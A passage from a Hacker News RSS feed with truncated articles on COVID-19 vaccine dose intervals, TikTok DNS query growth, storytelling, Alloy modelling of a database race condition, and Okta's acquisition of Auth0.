	<li><strong>Assessment of available data on efficacy and effectiveness</strong> of a single dose of mRNA vaccine was a critical factor in assessing the impact of a delayed second dose at this time. The two available clinical trials for mRNA vaccines (Pfizer-BioNTech and Moderna) provide evidence that indicates that efficacy against symptomatic disease begins as early as 12 to 14 days after the first dose of the mRNA vaccine. Excluding the first 14 days before vaccines are expected to offer protection, both vaccines showed an efficacy of 92% up until the second dose (most second doses were administered at 19-42 days in the trials). Recently, real world vaccine effectiveness data presented to or reviewed by NACI assessing PCR-positive COVID-19 disease and/or infection from Quebec, British Columbia, Israel, the United Kingdom and the United States support good effectiveness (generally 70-80%, depending on the methodology used and outcomes assessed) from a …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html">https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html</a></em></p>]]>
            </description>
            <link>https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360556</guid>
            <pubDate>Fri, 05 Mar 2021 18:58:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Next Generation Website Builder]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26360542">thread link</a>) | @okozzie
<br/>
March 5, 2021 | https://straw.page/start | <a href="https://web.archive.org/web/*/https://straw.page/start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://straw.page/start</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360542</guid>
            <pubDate>Fri, 05 Mar 2021 18:57:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TikTok Popularity Growth or New Feature Increasing DNS Queries?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26360222">thread link</a>) | @serenadns
<br/>
March 5, 2021 | https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news | <a href="https://web.archive.org/web/*/https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>TikTok has been <a href="https://brandastic.com/blog/what-is-tiktok-and-why-is-it-so-popular/#:~:text=The%20TikTok%20app%20has%20been,123%20million%20from%20the%20U.S.&amp;text=Bytedance%20the%20company%20that%20owns,the%20world's%20most%20valuable%20startup%20.">growing in popularity</a> steadily since 2019 despite <a href="https://threatpost.com/tik-tok-ban-security-experts-dangers/159362/#:~:text=In%20fact%2C%20Comparitech%20evaluated%20TikTok,advocate%20with%20Comparitech%2C%20told%20Threatpost.">concerns over its security</a> in the US. It’s been <a href="https://www.oberlo.com/blog/tiktok-statistics#:~:text=The%20TikTok%20app%20has%20been,more%20than%2033%20million%20downloads.">downloaded over <strong>2 billion times</strong></a> and hit <a href="https://wallaroomedia.com/blog/social-media/tiktok-statistics/#:~:text=Monthly%20Active%20Users%20%E2%80%93%20TikTok%20has,of%20now%20(February%202021).">1 billion active monthly users</a> as of February 2021. For context, competitor app Instagram (owned by Facebook) had 1 billion active monthly users <a href="https://www.statista.com/statistics/253577/number-of-monthly-active-instagram-users/">back in 2018</a>. And TikTok seems poised to take the No. 1 spot in 2021.<br></p><p>We’ve been monitoring the growth of TikTok popularity on our network, as we’re curious about the app’s increased usage. DNSFilter is a product used primarily by other businesses, so we’ve been surprised by the use of TikTok on corporate networks.&nbsp;<br></p><p>In March 2020, TikTok DNS queries accounted for under .5% of our entire network traffic. By the end of July, it made up 1.3% of our network traffic—that was a 7x increase when looking at the number of queries. To put this into perspective, the entire <strong><em>category</em></strong> of shopping sites on our network at the end of July 2020 made up <strong>2% of our entire network</strong>.<br></p><p>I should note: There are over 14,000 companies that route their traffic through DNSFilter and we see roughly 12 billion DNS queries daily. So while our network does not allow us to view internet traffic as a whole, we <em>are</em> able to see overall trends.&nbsp;<br></p><p>In early February 2021, we noticed another major spike in traffic to TikTok:</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/604123432b07fa4bdec5385d_001h98GlCeJ2zwmnM1537Jf45q3Nty7WJCs91SYRWk34DgJuzYh9ssiI2mWZujOvTtGJAgxN7g0BfP809muA0Xrn3NxavqgdCR8qQxaBvGrYR8TvMtSB9LcDF4oFL87TMsRv9jsy.png" alt=""></p></figure><p>Prior to February 3, our network was resolving around 6.3 million TikTok queries daily (that number had held relatively steady since July 2020). The day of the spike, we saw 11.96 million queries. And as of February 25, we’ve seen as high as <em>15.15 million queries</em> in a day.<br></p><p>This made us ask the question: Did TikTok <em>really</em> see a 100% increase in traffic overnight? Or is there something else happening?</p><h2>Many domains, one application</h2><p>Before we go any further, I want to explain why one application is usually comprised of more than one domain. Applications like TikTok don’t use a single domain for all of the content on their service. Under the TikTok umbrella, there might be <em>hundreds</em> of domains.<br></p><p>The reason for all of these domains varies. One domain might be responsible for the TikTok site content, as in tiktok.com. Another domain might be a Content Delivery Network (CDN), a place to host files (such as the video content users host) that the application then “calls” for when someone wants to view that content. And then there might be service domains to host API endpoints.&nbsp;<br></p><p>Depending on their setup, they may use different hostnames for geographic scaling or simply as a method of distributing load. Not all applications do it this way, but it is one possibility. Doing it this way would mean those 1.5 billion TikTok users are served different domains based on their geolocation.</p><p>The ability to block and allow entire applications (as opposed to individual domains) is actually something we’re working on at DNSFilter and part of why we were able to identify this TikTok growth in the first place. <a href="https://dnsfilter.canny.io/feature-requests/p/additional-quick-lists-for-easy-blocking-of-popular-services">Keep an eye on our roadmap for updates</a>.</p><h2>Researching TikTok’s domain growth: Real or not?</h2><p>There is no doubt that starting February 3 there were more DNS queries accessing TikTok. The question is: What is the purpose of these queries?<br></p><p>Were these additional queries generated by users who are just using the site more? Were these queries initiated by <strong><em>TikTok </em></strong>or another service that uses them?&nbsp;<br></p><p>So with that, Domain Intelligence Lead Peter Lowe and I started digging into these questions.<br></p><p>Before looking into the actual queries, we first wanted to rule out any changes to <strong>caching</strong> or <strong>TTL</strong> (time to live). TTL is the lifespan of how long a domain name record is cached for. If the TTL has a shorter time out period, it will look like there are more requests to a domain. However, this didn’t seem to be the case for TikTok.<br></p><p>Next, we looked at the queries themselves. Of the domains under the umbrella of the TikTok application, which ones were requested the most?<br></p><p>Here, we got a clear answer: tiktokcdn[dot]com was responsible for this large spike in traffic. Here’s a comparison of the main TikTok domain to the tiktokcdn domain:</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/60412343fa7329ac84611b92_MQn0NsNR2PuWFBiRM-XJzDCc3BL3ZO-NEUMAc4D8nNJA986opKzDc18v9RHs8gORhORGui3sKjAU0RfJxW1NkCHX8W0g5oZeZbAbM9moIHDcqPkyOwNR7pjGlXXkft3ZqV690HDy.png" alt=""></p></figure><p>This domain was <strong><em>single handedly</em></strong> responsible for the spike in DNS queries.<br></p><p>Now that we knew the main domain making these queries, we could do a comparison between February 3 (the day of the spike) and January 27 (one week before). The reason we’d look at one week before as opposed to the day before is that domain queries generally tend to follow a pattern based on the day of the week. This way, we’re comparing apples to apples (or Wednesdays to Wednesdays).&nbsp;<br></p><p>We compared the total number of organizations and networks that accessed TikTok during this time—the numbers were essentially the same. In fact, January 27 actually had a few <em>more</em> organizations (and networks) connecting to TikTok than February 3.<br></p><p>Definitively, this spike was <em>not</em> based on new usage. It is based on new <em>queries</em>.<br></p><p>That this domain literally includes “CDN” in its name tells us it’s very likely a CDN domain. Though we can’t rule out that TikTok’s domain naming convention is purposefully meant to conceal the actual goal of the domain—but I promise we won’t get into conspiracy theories today.<br></p><p>Going with the assumption that this tiktokcdn[dot]com domain is <em>actually</em> a CDN domain where static files are hosted by TikTok, this still doesn’t answer the question of <em>who</em> is initiating these queries. An increase in CDN queries could mean users are suddenly requesting the same content as before (just more often), that the app itself is requesting content more frequently, or that another service (possibly owned by TikTok) is now using TikTok domains to serve content.<br></p><p>If you’re wondering how that third option would work, I’ll use the app <a href="https://www.goodreads.com/">Goodreads</a> as an example. Goodreads is owned by Amazon. When I open up my Goodreads app and then look in DNSFilter’s query log, I’ll see that I’ve accessed domains containing both “goodreads” and “amazon” in the domain names. In fact, in just a few minutes of clicking through my Goodreads history within the app, the application generates roughly 40 DNS queries: 32 of them include “Amazon” in the domain or subdomain name and only 8 actually include “Goodreads.”&nbsp;</p><h2>What happened on February 3?</h2><p>Our CEO, Ken Carnesi, is the one who first noticed the TikTok spike. He also found that on February 3 TikTok released an update. The only context he could find in the release notes for <a href="https://appmagic.rocks/ipad/tiktok/835599320/info?metrics=top_free">TikTok version 18.5.0</a> was a single line: “Share your favorite effects with friends.”<br></p><p>Could the purpose of these new queries be tied to this new “share your favorite effects” feature?&nbsp;<br></p><p>But there was another TikTok update on the same day that got a little more attention. <a href="https://newsroom.tiktok.com/en-us/new-prompts-to-help-people-consider-before-they-share">This&nbsp; particular update</a> was all about flagging unsubstantiated content to help fight fake news—something that’s been plaguing social platforms in recent years. According to TikTok, sometimes fact checks on videos that are flagged as misinformation are inconclusive. Rather than take the content down the content in question, TikTok released a new banner that would appear on possibly misleading information with the warning: “Caution: Video flagged for unverified content.”</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/60412343d9397424fe443e00_g8ju0AT2WmSJHO86y1urHGBRES50rZV7NcUEdM6rZf-6lY8o8yL0OYtzXgRTVGwEaalgrtYi8MWla8Wan9YODAoH04-4cudgcinKRNTto50XztKz41lRTqiHM_QqfWMWuVhjAuLw.png" alt=""></p></figure><p>This new feature would alert content creators who receive a warning label on their video, load a warning label over said video, and if a user were to share a video they would be prompted with a message asking “Are you sure you want to share this video?”<br></p><p>All of these changes within the app would likely be served by a CDN. Next up was to test our hypothesis that one of these updates was linked to the increase in DNS queries.</p><h2>How many queries does TikTok generate?</h2><p>Applications generate a lot of queries.&nbsp;<br></p><p>Browsing on Instagram for 5 minutes can generate upwards of 300 queries—especially if you’re searching for new content. Applications like Fitbit run in the background and send queries regularly. While browsing Instagram for 5 minutes, Fitbit will likely send 4 DNS queries. And after just a minute of using the Fitbit app, I found nearly 100 queries in the DNSFilter query log.<br></p><p>Fitbit generates more queries than Instagram because it’s using DNS to lookup server IPs it's constantly sending data to, from my Fitbit device and app. Instagram might need to communicate with servers where files are hosted, but otherwise it’s not sending DNS queries to external devices.<br></p><p>Between 1:30 - 4:00, I had TikTok downloaded on my phone. In that time, I generated nearly 2,000 DNS queries—76% of them included “CDN” in the domain name.<br></p><p>But this isn’t that rare. Of the Fitbit queries I mentioned earlier, 73% of them were CDN domains. And 77% of the Instagram domain queries were CDN domains.<br></p><p>To dive into where these CDN queries were most active, I tracked usage across the app and would spent a period of time performing a single action. These were:<br></p><ul role="list"><li>Scrolled through recommended videos</li><li>Used the search feature</li><li>Flagged videos as misinformation</li><li>Clicked on videos with some type of warning</li><li>Favorited effects<br></li></ul><p>Of all of these actions, favoriting filters and sounds connected to CDN domains more than the rest—92% of queries during the period I favorited those items were CDN domains. Surprisingly, flagging misinformation and clicking on videos with warning resulted in the lowest number of CDN queries.</p><h2>What could be driving TikTok queries?</h2><p>Based on the CDN usage of just <em>favoriting</em> effects, it seems reasonable that sharing the effect would generate a large number of DNS queries. Considering there was an update on February 3, it’s possible that update is causing this prolonged spike in queries because it needs to communicate with CDN servers more often.<br></p><p>But we still have other theories.<br></p><p>Because the total number of DNS queries generated by TikTok and its competitor Instagram are similar (browsing TikTok for 5 minutes generated 196 queries while browsing Instagram generated 258), I think it’s possible that there is an <em>external</em> application using the tiktokcdn[dot]com domain. This could be a sister app of TikTok’s, like <a href="https://www.douyin.com/">Douyin</a>, or it could be another service that’s enabling users to post TikTok videos. In both cases, they’d need to refer to TikTok’s CDN servers.<br></p><p>Peter …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news">https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news</a></em></p>]]>
            </description>
            <link>https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360222</guid>
            <pubDate>Fri, 05 Mar 2021 18:36:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do What Makes the Best Story]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 53 (<a href="https://news.ycombinator.com/item?id=26359378">thread link</a>) | @tosh
<br/>
March 5, 2021 | https://amasad.me/story | <a href="https://web.archive.org/web/*/https://amasad.me/story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Kids are always telling themselves stories. Try to remember yourself as a child lying in bed, anticipating an exciting day tomorrow, and you'll probably remember telling yourself a story about how cool it's going to be, who's going to be there, and how much fun you'll have. Self storytelling might be more pronounced in kids -- they like to say it out loud -- but it never goes away and only subsides to the background in adults. Self storytelling is so essential for people that one of the most effective <a href="https://en.wikipedia.org/wiki/Cognitive_behavioral_therapy">techniques</a> for treating depression and anxiety boils down to "tell yourself better stories." </p>
<p>Life is also a form of self storytelling. We're continually retelling ourselves our life story, but very few people think of themselves as authors of their story, not mere subjects. People with extraordinary high-agency realize this early in life and start maximizing the interestingness of their life story.</p>
<p>Having a fascinating life story is not just an exercise in vanity -- it has a real impact on your success in life. You'll have an easier time attracting friends as well as life and business partners. It'll also make it much easier to sell yourself or your products. It has a kind of compounding <a href="https://en.wikipedia.org/wiki/Halo_effect">halo effect</a>.</p>
<p>Startups also have to be good stories. A good business idea or market is not enough to endure the pain and have the motivation to get a startup off the ground. Without an interesting story about the founding of the company and the vision, you'll have a hard time attracting talent and money. Notice how the most successful startups in the world all have remarkable genesis stories. </p>
<p>So next time you're faced with a tough decision, consider the path that makes a more interesting story. If it turned out to be the wrong decision to have made, you'd at least be fun at dinner parties.</p>

          </div></div>]]>
            </description>
            <link>https://amasad.me/story</link>
            <guid isPermaLink="false">hacker-news-small-sites-26359378</guid>
            <pubDate>Fri, 05 Mar 2021 17:26:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DataViz, Covid-19 Vaccination progress by country]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358630">thread link</a>) | @patak_js
<br/>
March 5, 2021 | https://research.leniolabs.com/vaccinations | <a href="https://web.archive.org/web/*/https://research.leniolabs.com/vaccinations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://research.leniolabs.com/vaccinations</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358630</guid>
            <pubDate>Fri, 05 Mar 2021 16:25:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alloy and an Adventure with Database Concurrency]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358383">thread link</a>) | @lelf
<br/>
March 5, 2021 | https://blog.typeable.io/posts/2021-03-05-alloy.html | <a href="https://web.archive.org/web/*/https://blog.typeable.io/posts/2021-03-05-alloy.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>This post is a short case study of using the Alloy modelling language to support software development work.</p>

<p>At Typeable we are very conscious about software quality and we are ready to go to some lengths to achieve it. Our current touchpoints for weeding out errors are the following:</p>
<ol type="1">
<li>Analysis and specification by dedicated persons</li>
<li>Applying Haskell type system is to weed out trivial errors</li>
<li>Usual unit and integration tests</li>
<li>Continuous integration</li>
<li>Mandatory code review</li>
<li>Testing in staging environment by dedicated QA engineers (check out <a href="https://github.com/typeable/octopod">Octopod</a>, our open-source solution for managing multiple deployments)</li>
<li>Testing in pre-production environment</li>
<li>Logging and error monitoring during production</li>
</ol>
<p>Having these many steps helps to keep the code good quality but it also imposes costs. The steps need both time and work.</p>
<p>One way of reducing these costs is by catching your errors early. To give a rough estimate, if the type system catches your error, it will do so within 30 seconds after saving your file. If the error is caught by the CI, it will take up to 30 minutes to produce the error message. And you have to wait another 30 minutes after fixing your mistake for the CI to run again.</p>
<p>The further you go down the chain, the longer these pauses get and the more resources are burned up by mistakes: reaching the QA stage might sometimes take days and then a QA engineer needs to engage with your work. And if the mistake is found here, not only must the QA redo their tests after the mistake is fixed, but the developer needs to pass through all the preceding stages again!</p>
<p>So, how far can we go to catch errors as early as possible? Surprisingly, there is a possibility to greatly improve our chances of catching errors even before writing a single line of code!</p>
<h2 id="enter-alloy">Enter Alloy</h2>
<p>This is where Alloy comes in. Alloy is a splendidly simple and ergonomic modelling tool that allows you to build testable specifications for the system you’re about to code.</p>
<p><img src="https://blog.typeable.io/images/alloy/1.png"></p>
<p>What Alloy does in practice is that it offers a simple language for building an abstract model of your idea or specification. And when the model is built, Alloy will do its best to show you all the disturbing things your specification will permit. It can also do model checking for any properties you think are important.</p>
<p>Let’s pick up an example! Recently we had a nuisance issue with the following bit of code:</p>
<div id="cb1"><pre><code><span id="cb1-1">newAuthCode</span>
<span id="cb1-2"><span>  ::</span> (<span>MonadWhatever</span> m)</span>
<span id="cb1-3">  <span>=&gt;</span> <span>DB.Client</span></span>
<span id="cb1-4">  <span>-&gt;</span> <span>DB.SessionId</span></span>
<span id="cb1-5">  <span>-&gt;</span> m <span>DB.AuthorizationCode</span></span>
<span id="cb1-6">newAuthCode clid sid <span>=</span> <span>do</span></span>
<span id="cb1-7">  <span>let</span> codeData <span>=</span> mkAuthCodeFor clid sid</span>
<span id="cb1-8">  void <span>$</span> DB.deleteAllCodes clid sid</span>
<span id="cb1-9">  void <span>$</span> DB.insertAuthCode codeData</span>
<span id="cb1-10">  <span>return</span> code</span></code></pre></div>
<p>This was in an HTTP endpoint and the code was supposed to go in to the database, delete all existing authorization codes for the user and write a new one in. Mostly, the code did just that. But it was also slowly filling our logs with “uniqueness constraint violation” messages.</p>
<p>How come?</p>
<h2 id="modelling">Modelling</h2>
<p>The above problem makes a good example problem for Alloy. Let’s try to figure it out by building a model! To model our specific problem case, we would usually start by describing our idea of <code>newAuthCode</code> operations to Alloy. That is, one would first build a model of the operations, then complement it by building a model of the database and linking the behaviour of the database to the operations.</p>
<p>However, in this case, it turns out that just formalizing our notion of what our operations could look like is enough to spot the problem.</p>
<p>The process described by our code snippet has two interesting parts. It does a delete at some point in time and then it inserts a new token at some other time. Here is one Alloy model for specifying this behaviour:</p>
<pre><code>open util/time  // Import premade Time objects

sig Operation       // There are operations...
  { delete : Time   // ...that do a delete on some time instance
  , insert : Time   // ...and an insert at some other time
  }
  { lt[delete,insert]  // The deletes happen before the inserts
    lt[first,delete]   // And, for technical reasons, nothing happens
                       // during the first time instance.
  }
  run {some Operation} for 4 // Show me a random instance with up to
                             // 4 Operations</code></pre>
<p>The above model describes a system of abstract objects and relationships between those objects. Running the model will then produce a random universe containing some <code>Operations</code> that are laid out according to the given rules.</p>
<p>If you want to follow along, download <a href="https://alloytools.org/">Alloy</a> and copy-paste the above snippet into it. Then press ‘execute’ and ‘show’ to get the following view of the model:</p>
<p><img src="https://blog.typeable.io/images/alloy/2.png"></p>
<p>To get Alloy to show you more models, you can press ‘next’.</p>
<p>Here is one of those random instances laid out as a relationship table (you need to press ‘next’ a few times and choose ‘Table’ view):</p>
<pre><code>┌──────────────┬──────┬──────┐
│this/Operation│delete│insert│
├──────────────┼──────┼──────┤
│Operation⁰    │Time¹ │Time³ │ ← Operation⁰ does a delete at Time¹ and
├──────────────┼──────┼──────┤   insert at Time³
│Operation¹    │Time² │Time³ │ ← Operation¹ does a delete at Time² and
└──────────────┴──────┴──────┘   insert at Time³
                         ↑
                      Oh dear!</code></pre>
<p>Usually, at this point, we’d start modelling database tables and semantics of the operations, but it turns out that Alloy has already managed to make it obvious why our logs have constraint violations!</p>
<p>Our handler gets called concurrently and the operation sequences overlap badly: there are two operations and they both do a delete around the same time and then <em>they both do an insert at the same time</em>. Also, since this is not a read, the postgresql default isolation level will not do anything to stop this from happening.</p>
<p>I found the bug!</p>
<h2 id="lets-fix-it">Let’s fix it!</h2>
<p>When I first investigated the issue, I wrote essentially the following fix for it.</p>
<div id="cb4"><pre><code><span id="cb4-1">code <span>&lt;-</span> run <span>$</span> <span>do</span></span>
<span id="cb4-2">  handleJust constraintViolation</span>
<span id="cb4-3">    (launchPG <span>$</span>&nbsp;selectCodeForSession clid scope sid</span>
<span id="cb4-4">    (launchPG <span>.</span> pgWithTransaction <span>$</span> newAuthCode clid scope sid)</span></code></pre></div>
<p>My idea was that if the operations did overlap and the insertion did fail, we then know that a new auth code has just been inserted. So, we can just do a <code>select</code> and return this existing code, since it can’t be more than a moment old.</p>
<h2 id="will-it-work-now">Will it work now?</h2>
<p>Let’s build a quick Alloy model for our fix to see if we got it correct:</p>
<pre><code>open util/time // Import Time

sig Token {} // There are objects called tokens

one sig DBState // There is a database with some tokens
 {userToken : Token lone -&gt; Time}
    // There are one or zero tokens at any given time in the DB
    // (because database constraints don't allow for more than one)

sig Operation {
   delete : Time
 , insert : Time
 , select : Time // Our operations can now also do a select
}
{
  lt[first,delete]   // Nothing happens on first time instance for
                     // technical reasons

  lt[delete,insert]  // delete happens first

  lte[insert,select] // insert can happen after, or at the same time
                     // as delete

  no userToken.(insert.prev) // If the insert works (ie. table is
  =&gt; insert = select         // empty when we try, we get the value
                             // at the time of the insert (ie. we have
                             // 'INSERT RETURNING' statement)
                             // Otherwise, we execute the exception handler and
                             // the select may happen a bit later.
}</code></pre>
<p>Up to this far the model follows the previous model quite closely. We added a <code>DBState</code> for modelling the table that stores our tokens and our operations now do a select, which must occur similarly as it occurs in our code. That is, if the table is empty, we select the token while inserting it and if the table is full, we select it later in the exception handler.</p>
<p>Then we get to the interesting part of the model, which is specifying the interactions between the operations and the database state. Luckily, for our model this is rather simple:</p>
<pre><code>fact Trace {                           // The trace fact describes how our system behaves
 all t : Time - first | {              // at all time steps, except the first:

   some delete.t =&gt; no userToken.t       // If there is a delete, the table is empty

   some insert.t =&gt; some userToken.t     // If there is an insert, table is not empty

   no delete.t and no insert.t           // If there are no inserts and no deletes,
	=&gt; userToken.t = userToken.(t.prev)  //   the table does not change
  }
}</code></pre>
<p>That is, we describe how the database changes state regarding which events take place.</p>
<p>Running this model creates many instances, but unlike before, just browsing through them is not enough to find anything obviously wrong. But we can ask Alloy to check some facts for us. This point can take a little thinking, but it seems that our fix could work if all the selects work.</p>
<p>Let’s state that as an assertion and ask Alloy to check if it holds.</p>
<pre><code>assert selectIsGood {         // This is what we want Alloy to check
 all s : Operation.select |   // For all times when there is a select
  some userToken.s            // there is also a token in the database.
}

check selectIsGood for 6 // Check that selectIsGood is always true.</code></pre>
<p>And, unfortunately, running this check gives us the following counterexample:</p>
<pre><code>┌────────┬────────────┐
│DBState │userToken   │
├────────┼──────┬─────┤
│DBState⁰│Token²│Time³│
│        │      ├─────┤  ← Token² is in the DB at Time³ and Time⁵
│        │      │Time⁵│
│        ├──────┼─────┤
│        │Token³│Time²│  ← Token³ is in the DB at Time².
└────────┴──────┴─────┘
                   ↑
                 There are tokens in the table
                 only on Time², Time³ and Time⁵
                 Notably, there are no tokens at
                 Time⁴!

┌──────────────┬──────┬──────┬──────┐
│Operation     │delete│insert│select│
├──────────────┼──────┼──────┼──────┤
│Operation⁰    │ TIME⁴│ Time⁵│ Time⁵│
├──────────────┼──────┼──────┼──────┤
│Operation¹    │ Time¹│ Time³│ TIME⁴│   ← The table is empty at Time⁴ and</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.typeable.io/posts/2021-03-05-alloy.html">https://blog.typeable.io/posts/2021-03-05-alloy.html</a></em></p>]]>
            </description>
            <link>https://blog.typeable.io/posts/2021-03-05-alloy.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358383</guid>
            <pubDate>Fri, 05 Mar 2021 16:09:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The reason Okta spent $6.5B on Auth0]]>
            </title>
            <description>
<![CDATA[
Score 200 | Comments 138 (<a href="https://news.ycombinator.com/item?id=26358309">thread link</a>) | @advaitruia
<br/>
March 5, 2021 | https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0 | <a href="https://web.archive.org/web/*/https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14.png" loading="lazy" width="680" sizes="(max-width: 479px) 320px, (max-width: 767px) 540px, 680px" alt="Express session vs SuperTokens" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-1600.png 1600w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14.png 2835w"></p><p>March 05, 2021</p>

<p>Okta acquired <a href="https://www.okta.com/press-room/press-releases/okta-signs-agreement-to-acquire-auth0/">Auth0 for $6.5B</a> in an all stock deal (Okta was valued at ~$35B in the few days preceding the
announcement).<br></p>
<p>In July last year, Auth0 <a href="https://auth0.com/blog/auth0-announces-120m-seriesf-funding/">raised $120M</a> in private financing at a valuation of $1.9B. The round was led by Salesforce
Ventures with participation from DTCP and other existing investors.<br></p>
<p><strong>The acquisition is a ~3.5X jump in Auth0â€™s valuation from last year.Â&nbsp;</strong><br></p>
<h2 id="Security">Why acquire Auth0 for $6.5B?</h2>

<ol role="list">
<li>
<p><span>Complementary product and revenue streamâ€¨<br></span>Oktaâ€™s
core strength is workforce identity and it used to be almost all of their revenue. In the last few years,
revenues from their customer identity product has grown to 25% of total revenues from almost nothing. Auth0
core strength is customer identity. With Auth0, Okta has the best product for both use cases.<br></p>
</li>
<li>
<p><span>Increasing addressable marketâ€¨<br></span>According to Todd,
the founder of Okta, workforce identity is a $30B market and customer identity is $25B. The customer identity
space effectively doubles Oktaâ€™s addressable market. In return, Okta is paying 20% of its market cap for that
opportunity.<br></p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta.png" loading="lazy" sizes="(max-width: 479px) 280px, (max-width: 767px) 500px, 640px" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta.png 1582w" alt="">
</li>
<li>
<p><span>Competition and pricing power<br></span>Auth0 is the most
prominent alternative that customers consider when evaluating Okta. The acquisition of Auth0 eliminates that
threat and grants Okta pricing power as a result.<br></p>
</li>
<li>
<p><span>Go To Market (GTM) strategy<br></span>Okta is built as a top
down sales organisation whereas Auth0 is built with a developer first bottoms up acquisition strategy. This
allows Okta to get the best of both worlds.<br></p>
<p>In the words of the Founder and CEO of Auth0, â€œWe have a large thriving developer
community, which provides powerful grassroot support for Auth0 within SMB and enterprise that we leverage in
our sales motion. Our developer-led adoption fosters rapid customer growthâ€�<br></p>
</li>
<li>
<p><span>Strategic acquisition<br></span>There were rumours that
Salesforce was interested in acquiring Auth0. Given that Salesforce has made several key acquisitions (Slack,
Mulesoft, and others) and led Auth0â€™s last round, this is a well founded theory. It is possible that Okta had
to make a preemptive move. Weâ€™ve heard anecdotally that Salesforceâ€™s and Oracleâ€™s identity solution were both
performing badly and they were looking to do something about it. Auth0 was the perfect candidate for and was
also supposedly being shopped around.<br></p>
</li>
</ol>
<p>Finally, â€¨there was a Hackernews comment along the lines of: â€œ$6,500,000,000.00 for a company
providing authentication APIs?â€� and the sentiment has been echoed by others too.<br></p>
<p>The thing to note is that Okta isn't just acquiring an API or a product. Itâ€™s acquiring
$200M in recurring revenue thatâ€™s probably growing at 50%. As soon as Okta acquires its largest competitor, it can
also refactor Auth0â€™s (and itâ€™s own) pricing to increase revenue even further. So it's paying a lot upfront
for what it hopes will be even more in the future.Â&nbsp;<br></p>
<p>Now that we have some clarity on the acquisition, weâ€™ll be looking at how the (stock) market,
users and employees reacted to the news (largely drawn from Reddit, Hackernews and some personal
conversations)<br></p>
<h2><strong>Reactions (and what this means)</strong><br></h2>

<p><span>Market<br></span>Oktaâ€™s will acquire Auth0 in an all stock deal
and dilute existing shareholders by 20%. The 10% fall in the stock price (equivalent to a decrease in $3-4B)
immediately post the announcement means that investors are valuing Auth0 at half the price what Okta paid for
it.<br></p>
<p>Okta will issue shares to Auth0 shareholders at share price of $276.21, close to 20% less
